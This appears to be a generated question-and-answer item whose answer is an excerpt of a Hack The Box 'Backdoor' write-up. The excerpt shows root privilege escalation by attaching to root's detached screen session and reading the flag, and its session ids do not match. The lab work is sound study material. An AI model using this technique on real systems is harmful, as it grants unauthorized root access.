@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Explain the purpose and usage of the code/command in the following text: (Context: Writeup from Htb Backdoor Hacks Stuff)
+
+CONTEXT:
+Source: Htb Backdoor Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+look in S-root . Adding root/ to the end of the command works: user@Backdoor:/home/user$ screen -ls S-root/ Cannot identify account 'S-root'. user@Backdoor:/home/user$ screen -ls root/ There is a suitable screen on: 947.root (04/20/22 16:43:20) (Multi, detached) 1 Socket in /run/screen/S-root. Interestingly, it does require the trailing / . Connect to screen Session I’ll connect to that session using -x and the [user]/[session id] : user@Backdoor:/home/user$ screen -x root/37344 Please set a terminal type. It complains about a missing terminal type. That’s typically set in an environment variable. I’ll add that to the front of the command, and on running TERM=screen screen -x root/37344 , I’m dropped into a screen session as root: root@Backdoor:~# It also works using the [user]/[session name] , so in this case, TERM=screen screen -x root/root . I can read root.txt : root@Backdoor:~# cat root.txt 499d4ef0************************ Parallelizing Bash and Python »
